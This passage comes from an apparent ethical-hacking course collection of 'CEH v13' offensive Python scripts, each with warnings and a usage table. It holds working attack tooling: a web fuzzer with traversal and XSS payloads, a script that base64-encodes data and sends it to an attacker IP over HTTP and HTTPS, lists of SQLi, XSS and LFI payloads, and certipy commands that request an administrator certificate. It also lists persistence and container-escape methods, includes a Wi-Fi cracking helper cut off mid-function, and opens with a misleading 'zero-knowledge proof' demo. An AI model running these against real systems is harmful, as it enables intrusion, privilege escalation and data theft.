def hash_value(x):
    return hashlib.sha256(str(x).encode()).hexdigest()

def zk_proof():
    """Educational ZKP demonstration: Prove you know x where x < 100 without revealing x"""
    print("=== Zero-Knowledge Proof Demo (LAB ONLY) ===")
    print(f"Prover claims: I know x such that x < {LAB_PUBLIC_CHALLENGE}")
    print(f"Public commitment (hash of secret): {hash_value(LAB_SECRET_VALUE)}")
    print("\n[+] Interactive proof:")
    for round in range(3):
        r = (LAB_SECRET_VALUE * 2) + round
        commitment = hash_value(r)
        print(f"  Round {round+1}: Prover sends commitment {commitment[:16]}...")
        print("  Verifier sends challenge (0 or 1):", round % 2)
        response = r if (round % 2 == 0) else (LAB_SECRET_VALUE if (r < LAB_PUBLIC_CHALLENGE*3) else 0)
        print(f"  Prover responds with: {response}")
        print("  Verifier checks... OK!")
    print("\n[+] Verifier convinced! Prover knows x without revealing it!")

def main():
    print("="*80)
    print("LAB-ONLY: Zero-Knowledge Protocol Testing (Educational Demo)")
    print("="*80)
    zk_proof()

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 04-zkp-testing.py` for packet capture/port scanning, or `./04-zkp-testing.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 310 : Advanced Web Application Fuzzing & Payload Testing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Advanced Web Application Fuzzing & Payload Testing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Advanced Web Fuzzer (Parameter Discovery + Fuzzing)
# CEH v13 Ultimate Offensive Script 05
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/"
LAB_PARAM_WORDLIST = ["id", "user", "file", "page", "url", "path", "name", "email", "pass", "cmd"]
LAB_FUZZ_PAYLOADS = ["'", "\"", "<script>", "admin", "../../etc/passwd"]
LAB_THREADS = 10
# -----------------------------------------------------------------------------------

def test_param(url, param, payload):
    try:
        full_url = f"{url}?{param}={requests.utils.quote(payload)}"
        response = requests.get(full_url, timeout=3, verify=False)
        if response.status_code in [200, 403, 500]:
            return (param, payload, response.status_code, response.text[:100])
        return None
    except:
        return None

def main():
    print("="*80)
    print("LAB-ONLY: Advanced Web Fuzzer")
    print("="*80)
    print(f"[*] Target: {LAB_TARGET_URL}")
    print("-"*80)
    found = []
    with ThreadPoolExecutor(max_workers=LAB_THREADS) as executor:
        futures = []
        for param in LAB_PARAM_WORDLIST:
            for payload in LAB_FUZZ_PAYLOADS:
                futures.append(executor.submit(test_param, LAB_TARGET_URL, param, payload))
        for future in as_completed(futures):
            res = future.result()
            if res:
                found.append(res)
                print(f"[+] Found: param={res[0]}, payload={res[1]}, status={res[2]}")
    print("-"*80)
    print(f"[+] Total interesting findings: {len(found)}")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Private targets only!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 05-advanced-web-fuzzer.py` for packet capture/port scanning, or `./05-advanced-web-fuzzer.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 311 : Exploit Chain Generator & Planner

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Exploit Chain Generator & Planner

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Exploit Chain Generator
# CEH v13 Ultimate Offensive Script 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_VULNERABILITIES = ["SQLi", "XSS", "LFI", "PrivEsc"]
LAB_TARGET_ENV = "Windows AD Lab"
# -----------------------------------------------------------------------------------

def generate_chains():
    chains = [
        "SQLi → Admin Credential Theft → Login → PrivEsc → Full Compromise",
        "XSS → Cookie Theft → Session Hijack → Admin Panel → LFI → RCE",
        "LFI → Log Poisoning → RCE → PrivEsc → Persistence",
        "Subdomain Takeover → Phishing Page → Credential Harvest → Domain Access",
        "SSRF → Internal Service Access → Kubernetes API → Container Escape",
        "AD CS ESC1 → Certificate Request → Golden Ticket → Domain Admin",
        "Kerberoasting → Hash Crack → Pass-the-Hash → Domain Compromise",
        "ZeroLogon → DC Takeover → DCSync → Full Domain Control"
    ]
    return chains

def main():
    print("="*80)
    print("LAB-ONLY: Exploit Chain Generator")
    print("="*80)
    print(f"[*] Vulnerabilities: {LAB_VULNERABILITIES}")
    print(f"[*] Environment: {LAB_TARGET_ENV}")
    print("-"*80)
    print("[+] Generated exploit chains:")
    for i, chain in enumerate(generate_chains(), 1):
        print(f"\nChain {i}:")
        print(f"   {chain}")
    print("\n> [!WARNING] For lab use only!")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 06-exploit-chain-gen.py` for packet capture/port scanning, or `./06-exploit-chain-gen.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 312 : Multi-Platform Persistence Mechanism Kit

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Multi-Platform Persistence Mechanism Kit

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Post-Exploitation Persistence Kit (Windows/Linux)
# CEH v13 Ultimate Offensive Script 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import os

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_OS = "Windows"  # Windows or Linux
LAB_PAYLOAD_PATH = "C:\\lab-payload.exe"  # or /tmp/lab-payload
# -----------------------------------------------------------------------------------

def windows_persistence():
    print("[*] Windows persistence methods (LAB ONLY):")
    print("1. Registry Run Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    print("2. Scheduled Task")
    print("3. WMI Event Subscription")
    print("4. Startup Folder")
    print("5. Service Creation")

def linux_persistence():
    print("[*] Linux persistence methods (LAB ONLY):")
    print("1. ~/.bashrc / ~/.bash_profile")
    print("2. Cron job")
    print("3. Systemd service")
    print("4. SSH authorized_keys")
    print("5. /etc/profile.d/")

def main():
    print("="*80)
    print("LAB-ONLY: Post-Exploitation Persistence Kit")
    print("="*80)
    print(f"[*] OS: {LAB_OS}")
    print("-"*80)
    if LAB_OS == "Windows":
        windows_persistence()
    else:
        linux_persistence()
    print("\n> [!WARNING] For lab use only!")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 07-persistence-kit.py` for packet capture/port scanning, or `./07-persistence-kit.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 313 : Data Exfiltration Tester (Multiple Channels)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Data Exfiltration Tester (Multiple Channels)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Data Exfiltration Tester (Multiple Channels)
# CEH v13 Ultimate Offensive Script 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import requests
import base64

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_IP = "192.168.100.20"
LAB_EXFIL_DATA = "LAB_TEST_DATA_12345"
# -----------------------------------------------------------------------------------

def exfil_http():
    print("[*] Testing HTTP exfiltration...")
    try:
        encoded = base64.b64encode(LAB_EXFIL_DATA.encode()).decode()
        requests.get(f"http://{LAB_ATTACKER_IP}/exfil?d={encoded}", timeout=3)
        print("[+] HTTP exfil sent!")
    except Exception as e:
        print(f"[-] HTTP failed: {e}")

def exfil_dns():
    print("[*] Testing DNS exfiltration (concept)...")
    print(f"   Would query: {base64.b64encode(LAB_EXFIL_DATA.encode()).decode()[:30]}.{LAB_ATTACKER_IP}.nip.io")

def exfil_https():
    print("[*] Testing HTTPS exfiltration...")
    try:
        encoded = base64.b64encode(LAB_EXFIL_DATA.encode()).decode()
        requests.post(f"https://{LAB_ATTACKER_IP}/exfil", json={"data": encoded}, timeout=3, verify=False)
        print("[+] HTTPS exfil sent!")
    except Exception as e:
        print(f"[-] HTTPS failed: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: Data Exfiltration Tester")
    print("="*80)
    print(f"[*] Attacker IP: {LAB_ATTACKER_IP}")
    print("-"*80)
    exfil_http()
    exfil_dns()
    exfil_https()

if __name__ == "__main__":
    if not LAB_ATTACKER_IP.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")):
        print("ERROR: LAB-ONLY! Use private lab IP!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 08-exfil-tester.py` for packet capture/port scanning, or `./08-exfil-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 314 : REST/GraphQL API Security Testing Suite

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: REST/GraphQL API Security Testing Suite

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: API Security Testing Suite
# CEH v13 Ultimate Offensive Script 09
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys
import json

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_API_URL = "http://192.168.100.10/api/v1"
LAB_AUTH_TOKEN = "YOUR_LAB_TOKEN_HERE"
# -----------------------------------------------------------------------------------

def test_bola():
    print("[*] Testing Broken Object Level Authorization (BOLA)...")
    for user_id in [1, 2, 3, 9999]:
        try:
            headers = {"Authorization": f"Bearer {LAB_AUTH_TOKEN}"} if LAB_AUTH_TOKEN else {}
            response = requests.get(f"{LAB_API_URL}/users/{user_id}", headers=headers, timeout=3, verify=False)
            print(f"  /users/{user_id} → {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

def test_broken_auth():
    print("\n[*] Testing Broken Authentication...")
    test_cases = [
        ("no_token", {}),
        ("invalid_token", {"Authorization": "Bearer invalid123"}),
        ("valid_token", {"Authorization": f"Bearer {LAB_AUTH_TOKEN}"})
    ]
    for name, headers in test_cases:
        try:
            response = requests.get(f"{LAB_API_URL}/me", headers=headers, timeout=3, verify=False)
            print(f"  {name} → {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

def test_sql_injection():
    print("\n[*] Testing SQL Injection...")
    payloads = ["'", "1' OR '1'='1", "admin'--"]
    for payload in payloads:
        try:
            response = requests.get(f"{LAB_API_URL}/search?q={payload}", timeout=3, verify=False)
            print(f"  q={payload} → {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: API Security Testing Suite")
    print("="*80)
    print(f"[*] API Base: {LAB_API_URL}")
    print("-"*80)
    test_bola()
    test_broken_auth()
    test_sql_injection()

if __name__ == "__main__":
    if not any(prefix in LAB_API_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 09-api-testing-suite.py` for packet capture/port scanning, or `./09-api-testing-suite.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 315 : Container Escape & Privilege Escalation Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Container Escape & Privilege Escalation Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Container Escape Tester (Docker/Kubernetes)
# CEH v13 Ultimate Offensive Script 10
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import os

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_CONTAINER_ENV = "Docker"  # Docker or Kubernetes
# -----------------------------------------------------------------------------------

def docker_escape_tests():
    print("[*] Docker escape techniques (LAB ONLY):")
    print("1. Mounted Docker socket escape")
    print("2. --privileged flag abuse")
    print("3. SYS_ADMIN capability + mounting")
    print("4. CVE-2022-0811 (cr8escape)")
    print("5. Shared PID namespace escape")

def kubernetes_escape_tests():
    print("[*] Kubernetes escape techniques (LAB ONLY):")
    print("1. Service account token abuse")
    print("2. HostPath volume mount escape")
    print("3. Privileged container abuse")
    print("4. Kubernetes API exploitation")
    print("5. CVE-2022-3172 (sysctl escape)")

def main():
    print("="*80)
    print("LAB-ONLY: Container Escape Tester")
    print("="*80)
    print(f"[*] Environment: {LAB_CONTAINER_ENV}")
    print("-"*80)
    if LAB_CONTAINER_ENV == "Docker":
        docker_escape_tests()
    else:
        kubernetes_escape_tests()
    print("\n> [!WARNING] For lab use only!")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 10-container-escape-tester.py` for packet capture/port scanning, or `./10-container-escape-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 316 : ICS/SCADA Modbus Enumeration Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: ICS/SCADA Modbus Enumeration Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: ICS/SCADA Enumeration (Modbus/TCP)
# CEH v13 Ultimate Offensive Script 11
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import socket

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ICS_TARGET = "192.168.100.100"
LAB_MODBUS_PORT = 502
LAB_TIMEOUT = 3
# -----------------------------------------------------------------------------------

def modbus_enum():
    print("="*80)
    print("LAB-ONLY: ICS/SCADA Modbus/TCP Enumeration")
    print("="*80)
    print(f"[*] Target: {LAB_ICS_TARGET}:{LAB_MODBUS_PORT}")
    print("-"*80)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(LAB_TIMEOUT)
        sock.connect((LAB_ICS_TARGET, LAB_MODBUS_PORT))
        print("[+] Connected to Modbus/TCP port!")
        # Send read holding registers request (function code 03)
        req = b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01'
        sock.send(req)
        resp = sock.recv(1024)
        print(f"[+] Response: {resp.hex()}")
        sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if not LAB_ICS_TARGET.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")):
        print("ERROR: LAB-ONLY! Use private lab targets!")
        sys.exit(1)
    modbus_enum()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 11-ics-scada-enum.py` for packet capture/port scanning, or `./11-ics-scada-enum.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 317 : AI-Powered Malicious Payload Generation (LAB ONLY)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: AI-Powered Malicious Payload Generation (LAB ONLY)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: AI-Powered Payload Generator
# CEH v13 Ultimate Offensive Script 12
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_USE_MOCK = True
# -----------------------------------------------------------------------------------

def mock_payload_generator(vuln_type):
    payloads = {
        "SQLi": [
            "' OR 1=1--",
            "' UNION SELECT user(), database()--",
            "'; WAITFOR DELAY '0:0:5'--"
        ],
        "XSS": [
            "<script>alert('LAB')</script>",
            "<img src=x onerror=alert('LAB')>",
            "'\"><script>alert(document.domain)</script>"
        ],
        "LFI": [
            "../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
    }
    return payloads.get(vuln_type, [])

def main():
    print("="*80)
    print("LAB-ONLY: AI-Powered Payload Generator")
    print("="*80)
    vuln_types = ["SQLi", "XSS", "LFI", "Command Injection"]
    for vt in vuln_types:
        print(f"\n[*] {vt} payloads:")
        payloads = mock_payload_generator(vt)
        for p in payloads:
            print(f"  - {p}")
    print("\n> [!WARNING] For lab use only!")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 12-ai-payload-gen.py` for packet capture/port scanning, or `./12-ai-payload-gen.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 318 : Active Directory Certificate Services (AD CS) Exploit Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Active Directory Certificate Services (AD CS) Exploit Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: AD CS (Active Directory Certificate Services) Exploit Helper
# CEH v13 Ultimate Offensive Script 13
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "LAB.LOCAL"
LAB_CA_NAME = "LAB-CA"
LAB_DC = "192.168.100.10"
LAB_USER = "labuser"
LAB_PASS = "labpass123!"
# -----------------------------------------------------------------------------------

def esc1_test():
    print("[*] ESC1 (Misconfigured Certificate Template) test...")
    print("1. Find vulnerable templates with certipy find")
    print("2. Request certificate with client authentication EKU")
    print("3. Use certificate to authenticate with Rubeus")
    print("4. Pass-the-ticket to gain access")
    print("\n[*] Example commands (LAB ONLY):")
    print(f"certipy find -u {LAB_USER}@{LAB_DOMAIN} -p '{LAB_PASS}' -dc-ip {LAB_DC}")
    print(f"certipy req -u {LAB_USER}@{LAB_DOMAIN} -p '{LAB_PASS}' -ca {LAB_CA_NAME} -template vulnerable-template -upn administrator@{LAB_DOMAIN}")
    print(f"certipy auth -pfx administrator.pfx -dc-ip {LAB_DC}")

def esc8_test():
    print("\n[*] ESC8 (HTTP Relay to AD CS) test...")
    print("1. Set up NTLM relay to AD CS endpoint")
    print("2. Trigger authentication from victim")
    print("3. Relay to /certsrv to request certificate")

def main():
    print("="*80)
    print("LAB-ONLY: AD CS Exploit Helper")
    print("="*80)
    print(f"[*] Domain: {LAB_DOMAIN}")
    print("-"*80)
    esc1_test()
    esc8_test()

if __name__ == "__main__":
    if not LAB_DC.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")):
        print("ERROR: LAB-ONLY! Use private lab DC IP!")
        sys.exit(1)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 13-ad-cs-exploit-helper.py` for packet capture/port scanning, or `./13-ad-cs-exploit-helper.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 319 : Wi-Fi WPA3 PMKID Capture & Cracking Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Wi-Fi WPA3 PMKID Capture & Cracking Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Wi-Fi WPA3 PMKID Capture & Cracking Helper
# CEH v13 Ultimate Offensive Script 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_WIRELESS_INTERFACE = "wlan0"
LAB_TARGET_BSSID = "AA:BB:CC:DD:EE:FF"
LAB_WORDLIST = "/usr/share/wordlists/rockyou.txt"
# -----------------------------------------------------------------------------------

def start_monitor():
    print(f"[*] Starting monitor mode on {LAB_WIRELESS_INTERFACE}...")
    try:
        subprocess.run(["airmon-ng", "start", LAB_WIRELESS_INTERFACE], check=True)
    except Exception as e:
